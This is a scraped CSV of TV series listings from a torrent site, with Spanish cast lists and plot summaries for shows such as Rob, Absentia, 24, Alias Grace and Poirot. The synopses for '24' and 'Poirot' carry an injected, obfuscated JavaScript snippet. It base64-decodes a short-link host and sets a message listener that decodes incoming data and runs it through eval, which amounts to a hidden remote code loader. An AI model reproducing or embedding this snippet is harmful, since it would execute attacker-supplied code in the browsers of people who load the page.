Series main_page_url,Series name,Ficha tecnica,Resumen
https://www.subtorrents1.com/series/rob/,¡Rob!,"
                       Título Original: Rob
Creador: Lew Morton
Producción Ejecutiva: Eric Tannenbaum, Kim Tannenbaum, Lew Morton y Rob Schneider
Estudio: CBS Television Studios
Género: Comedia
Temporada: 1ª 
Episodios: 8
Fecha de estreno: 12 de enero de 2012
Distribución Paramount
Horario de emisión Jueves 8.30 p.m.

Reparto:
Rob Schneider ... Rob
Claudia Bassols ... Maggie
Diana Maria Riva ... Rosa
Cheech Marin ... Fernando
Lupe Ontiveros ... Abuelita
Eugenio Derbez ... Hector						","
Descripcion
Rob es una comedia basada ligeramente en la vida real del actor Rob Schneider, un chico solitario y eterno soltero que, después de una corta relación sentimental, se casa con su novia latina y entra a formar parte de una extravagente familia mexicano-americana. Tras conocerla en un encuentro casual y comprometerse en tiempo récord, este arquitecto paisajístico decide poner fin a su estatus de soltero y se casa con una atractiva mujer llamada Maggie. A partir de ahí, empezará lo más díficil. Tendrá que ganarse a la sobreprotectora familia de Maggie, un clan latino que no está muy contento con dicha unión. Y es que cuando te casas con una chica, realmente te casas con toda su familia. ¡Prepárate para este gran choque cultural!
Rob (Rob Schneider, Gigoló) es un exitoso arquitecto paisajístico que, después de un frenético romance, se casa con Maggie (Claudia Bassols, Gavilanes), una atractiva y encantadora propietaria de una tienda de moda, que a simple vista parece demasiado para él. Maggie no le ha contado nada de su boda express en Las Vegas a nadie de su extensa familia latina. Pero ahora ella insiste en que Rob conozca formalmente a sus padres y familiares, arruinando sus planes de quedarse en casa y ""tener sexo todo el día"". El problema para ambos es que la familia de Maggie no recibirá a Rob todo lo bien que hubiesen deseado.
"
https://www.subtorrents1.com/series/absentia/,Absentia,"
                       Título original
    Absentia (TV Series) 
Año
    2017
Duración
    60 min.
País
    Estados Unidos Estados Unidos
Director
    Gaia Violo (Creator), Matt Cirulnick (Creator) 
Guion
    Matt Cirulnick, Elaina Perpelitt, Kate Powers, Antoinette Stella, Gaia Violo
Reparto
    Stana Katic, Patrick Heusinger, Richard Brake, Bruno Bichir, Cara Theobold, Amber Aga, Angel Bonanni, Paul Freeman, Ralph Ineson, Neil Jackson, Patrick McAuley, Nick Cornwall, J.R. Esposito, Nathan Wiley 
Productora
    Masha Productions
Género
    Serie de TV. Thriller. Drama 						","
Descripcion
Mientras persigue a un asesino en serie, una agente del FBI desaparece y es dada por muerta, dejando solos a su marido, también agente, y a su hijo de 3 años. Pero 6 años después reaparece para sorpresa de todos. Sin recordar nada de lo sucedido desde su secuestro, tiene que adaptarse a una nueva realidad en la que su marido ha rehecho su vida con otra mujer y su hijo no la conoce. Además, una nueva serie de asesinatos hacen pensar a algunos de sus compañeros que ella podría ser la autora.
"
https://www.subtorrents1.com/series/46-yok-olan/,46 Yok Olan,"
                       Título original
    46 Yok Olan (TV Series) 
Año
    2016
Duración
    60 min.
País
    Turquía Turquía
Director
    Serdar Akar 
Guion
    Ercan Mehmet Erdem
Fotografía
    Volkan Aslan
Reparto
    Erdal Besikçioglu, Yasemin Kay Allen, Melis Birkan, Saygin Soysal, Berkan Sal, Metin Belgin, Ayça Eren, Selin Uludogan, Özay Fecht, Suna Yildizoglu, Mert Asutay, Bahtiyar Engin 
Productora
    Nunova Film
Género
    Serie de TV. Drama. Thriller | Crimen 						","
Descripcion
Una terrible historia de como un profesor de genética experimenta con un tratamiento para su hermana en coma, mezclando remedios médicos y chamánicos, pero desata un efecto secundario inesperado.
"
https://www.subtorrents1.com/series/24/,24,"
                       Título Original: 24
Creador: Joel Surnow y Robert Cochran
Producción Ejecutiva: Joel Surnow, Robert Cochran, Ron Howard, Brian Grazer y Tony Krantz
Estudio: FOX
Género: Acción
Formato imagen: USA 16:9 / España 4:3 Fullscreen
Lugar de rodaje: Los Angeles
Sintonía: 24 Theme - Sean Callery
Horario de emisión Jueves 21:25 (doble episodio)

Temporadas: 8
Capítulos: 24

Temporadas: 9
Capítulos: 12

Reparto:
Kiefer Sutherland ... Jack Bauer
Elisha Cuthbert ... Kim Bauer
Carlos Bernard ... Tony Almeida
Dennis Haysbert ... David Palmer
Sarah Clarke ... Nina Mayers
Reiko Aylesworth  ...Michelle Dessler
Penny Johnson Jerald ... Sherry Palmer
Sarah Wynter ... Kate Warner
Leslie Hope ... Teri Bauer
James Badge Dale ... Chase Edmunds 
Mary Lynn Rajskub ... Chloe O`Brian
Xander Berkeley ... George Mason 
Lana Parrilla ... Sarah Gavin
Kim Raver ... Audrey Reines
Alberta Watson ... Erin Driscoll
Roger R. Cross ... Curtis Manning
William Devane ... James Heller
James Morrison ... Bill Buchanan
Louis Lombardi ... Edgar Stiles						","
Descripcion
Producida por Twentieth Century Fox Televisión, la serie ha batido record de audiencia y se ha consolidado como la propuesta televisiva más original de los últimos años, un producto muy bien estructurado, filmado con estilo cien por cien cinematográfico, que ofrece 24 horas de metraje trepidante, digno del mejor filme de acción.
Prueba de ellos son los premios que ha recibido hasta ahora, entre ellos un Emmy (Oscar de la televisión) al Mejor Guión, un Globo de Oro a la Mejor Serie Dramática y un Globo de Oro al Mejor Actor para su protagonista, Kiefer Sutherland. 24 cuenta con otros tres Premios Emmy en reconocimiento de la fotografía y de la música.
(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/a-place-to-call-home/,A Place To Call Home,"
                       Título Original: A Place To Call Home
Creador: Bevan Lee
Productor ejecutivo: John Holmes, Julie McGauran
Productor: Chris Martin-Jones
Location: Sydney, Nueva Gales del Sur, Australia
País: Australia
Idioma: Inglés
Género: Drama de época

Temporada: 1
Capítulos: 13

Temporada: 2
Capítulos: 10

Reparto:

Marta Dusseldorp ... Sarah Adams 
Noni Hazlehurst ... Elizabeth Bligh 
Brett Climo ... George Bligh 
Frankie J. Holden ... Roy Briggs 
David Berry ... James Bligh 
Arianwen Parkes-Lockwood ... Olivia Bligh 
Craig Hall ... el Dr. Jack Duncan 
Abby Earl ... Anna Bligh 
Aldo Mignone ... Gino Poletti 
Adam Gray ... Rene 
Dominic Allburn ... Harry Polson 
Vanessa Buckley ... enfermera Milly 
Rupert Degas ... Padre Patrick						","
Descripcion
La serie está ubicada después de la Segunda Guerra Mundial y se centra en Elizabeth Bligh la matriarca de la familia Bligh, cuyo hijo George controla los intereses de la empresa familiar, después de perder a su esposa Elaine George cree que nunca va a sentirse atraído por otra persona hasta que conoce a Sarah Adams, un mujer con un pasado misterioso que entra en su vida para el enojo de Elizabeth.4 George es padre de Jamie, un joven que tuvo que casarse con Olivia sin amarla por decreto de su abuela y Anna, una joven que tiene que esconder su amor por Gino, un joven que trabaja en las tierras de su familia y a quien conoce desde pequeño. A ellos se les unen Roy Briggs, un hombre que pierde su encanto luego de la muerte de su esposa e hijos y Jack Duncan, un médico y el protegido de Elizabeth.
"
https://www.subtorrents1.com/series/alias-grace/,Alias Grace,"
                       Título original
    Alias Grace (TV Series) 
Año
    2017
Duración
    45 min.
País
    Canadá Canadá
Director
    Mary Harron 
Guion
    Sarah Polley (Novela: Margaret Atwood)
Música
    Jeff Danna
Fotografía
    Brendan Steacy
Reparto
    Sarah Gadon, Edward Holcroft, Zachary Levi, Kerr Logan, Stephen Joffe, Rebecca Liddiard, Will Bowes, Michael Therriault, Sylvia Zuk, Diane D'Aquila, Scott Anderson, Isaak Bailey, Noah Carson, David Cronenberg, Anna Paquin, Dave Reachill 
Productora
    Halfire Entertainment / Tangled Productions
Género
    Serie de TV. Thriller | Siglo XIX. Basado en hechos reales. Mediometraje 
Grupos
    Adaptaciones de Margaret Atwood 						","
Descripcion
Grace Marks (Sarah Gadon) es una joven inmigrante irlandesa y empleada doméstica en el Alto Canadá que fue condenada por el brutal asesinato de su jefe, Thomas Kinnear, y su ama de llaves, Nancy Montgomery, en 1843. ¿Pero fue ella en realidad o sólo estaba en el lugar equivocado?
"
https://www.subtorrents1.com/series/9jkl/,9JKL,"
                       Título original
    9JKL (TV Series) 
Año
    2017
Duración
    22 min.
País
    Estados Unidos Estados Unidos
Director
    Pamela Fryman 
Guion
    Mark Feuerstein, Dana Klein, Austin Winsberg
Música
    Gabriel Mann
Reparto
    Mark Feuerstein, Elliott Gould, Linda Lavin, Liza Lapira, David Walton, Matt Murray, Albert Tsai, Hana Hayes, Fernando Martinez 
Productora
    CBS Television Studios / Kapital Entertainment. Distribuida por CBS
Género
    Serie de TV. Comedia | Sitcom. Sitcom familiar 						","
Descripcion
Josh Roberts (Mark Feuerstein), un actor divorciado, vive en el apartamento 9K del edificio en el que creció. Al lado, en el 9J, viven sus padres, y en el 9L vive su hermano con su mujer y su bebé. Josh tratará de poner límites para que su familia no se inmiscuya demasiado en su vida.
"
https://www.subtorrents1.com/series/90210/,90210,"
                       Título Original: 90210
Creador: Darren Star
Producción Ejecutiva: Gabe Sachs y Jeff Judah
Estudio: Paramount
Género: Drama
Temporada: 4ª temporada
Episodios: 22
Lugar de rodaje: Beverly Hills (California)
Distribución: Paramount
Audiencia temp. pasada: 1,82 millones de espectadores
Horario de emisión: Martes 8.00 p.m.

Reparto:
Shenae Grimes ... Annie Wilson
Tristan Wilds ... Dixon Wilson
Rob Estes ... Harry Wilson [ 1 - 2 ]
Lori Loughlin ... Debbie Wilson [ 1 - 3 ]
AnnaLynne McCord ... Naomi Clark
Dustin Milligan ... Ethan Ward [ 1 ]
Jessica Walter ... Tabitha Wilson [ 1 ]
Ryan Eggold ... Ryan Matthews [ 1 - 3 ]
Jessica Stroup ... Erin Silver
Michael Steger ... Navid Shirazi
Jessica Lowndes ... Adrianna Tate-Duncan
Matt Lanter ... Liam Court [ 2 + ]
Gillian Zinser ... Ivy Sullivan [ 2 +]						","
Descripcion
Emocionante y contemporáneo ""spin-off"" de la popular serie Sensación de Vivir, en la nueva 90210 la vida se ve a través de los ojos de Annie Wilson (Shenae Grimes, Degrassi: La nueva generación) y de su hermano Dixon (Tristan Wilds, The Wire), cuyo primer día en el instituto West Beverly Hills no les deja duda de que ya no están en Kansas. La familia Wilson, incluyendo al padre, Harry (Rob Estes, Melrose Place), que decide aceptar el puesto de director del instituto en el que estudió, y a la madre, Debbie (Lori Loughlin, Summerland), una reputada fotógrafa, acaba de mudarse a Beverly Hills para cuidar de la madre de Harry, Tabitha (Jessica Walter, Arrested Development), una festiva y decadente estrella de la televisión y miembro destacada de la Clínica Betty Ford.
"
https://www.subtorrents1.com/series/agatha-christies-poirot/,Agatha Christie's: Poirot,"
                       Título original: Agatha Christie's Poirot 
Año: 1989
Duración:100 min.
País: Reino Unido
Director: Edward Bennett,  Renny Rye,  Andrew Grieve,  Richard Spence,  Ross Devenish,  Brian Farnham,  Andrew Piddington,  Stephen Whittaker,  Peter Barber-Fleming,  John Bruce,  Ken Grieve
Guión: Clive Exton, Anthony Horowitz, David Renwick, Nick Dear (Personajes: Agatha Christie)
Música: Christopher Gunning, Stephen McKeon, Christian Henson 
Fotografía: Chris O'Dell, Ivan Strasburg, Norman G. Langley, Peter Jessop
Productora: Emitida por la cadena A&E Television Networks
Género: Intriga 

Temporada: 1
Capítulos: 10

Temporada: 2
Capítulos: 9


Temporada: 13
Capítulos: 5


Reparto:
David Suchet,  
Hugh Fraser,  
Philip Jackson,  
Pauline Moran,  
David Yelland,  
Richard Bebb,  
George Little,  
Laurence Richardson

Productora: Emitida por la cadena A&E Television Networks
Género: Intriga 						","
Descripcion
Los casos de un excéntrico y refinado detective belga.
Premios:
1990: 4 Nominaciones BAFTA TV, incluyendo mejor serie drama y actor (Suchet)
1991: 4 Nominaciones BAFTA TV, incluyendo mejor serie drama y maquillaje(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write("");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write("")})();
"
https://www.subtorrents1.com/series/2091/,2091,"
                       Título original
    2091: Jugar o morir (TV Series) 
Año
    2016
Duración
    60 min.
País
    Colombia Colombia
Director
    Felipe Martínez Amador, Álvaro Curiel 
Guion
    Andrés Gelós, Constanza Cabrera, Lucila Podestá, Luis E. Langlemey, Natacha Caravia, Martín Preusche
Música
    Emilio Kauderer
Fotografía
    Diego Jiménez
Reparto
    Manolo Cardona, Angie Cepeda, Benjamín Vicuña, Luz Cipriota, Ludovico Di Santo, Flora Martínez, José Restrepo, Christopher Von Uckermann, Natalia Reyes, Julio Bracho, Damián Alcázar, Cristina Rodlo, Jason Day, Salvador del Solar, Geraldine Zivic, Tim Janssen, María Barreto, Roberto San Martín, Claudio Cataño, Jean Paul Leroux, Liseth Bitar, Gonzalo Vivanco, Karen Carreno, Alejandra Buitrago, María Cecilia Sánchez 
Productora
    Coproducción Colombia-Argentina; Fox Telecolombia / Fox International Channels
Género
    Serie de TV. Ciencia ficción. Acción. Thriller | Videojuego. Distopía 						","
Descripcion
el comportamiento de la humanidad ha llevado los recursos del planeta a un punto de agotamiento tal que sus habitantes se ven obligados a buscar alternativas para asegurar su supervivencia. Los mejores siete jugadores de Nueva Manaos son reclutados por la Corporación Neodimio para jugar una partida extrema en la luna terraformada de Calisto. A bordo de ""Colonus"", que es a la vez nave y consola de videojuego, compiten entre sí por un lugar de privilegio en el bienestar de Ciudad Destino. Pero todo cambiará cuando Ferrán (Manolo Cardona), descubre la siniestra verdad que se esconde detrás de todo esto.
"
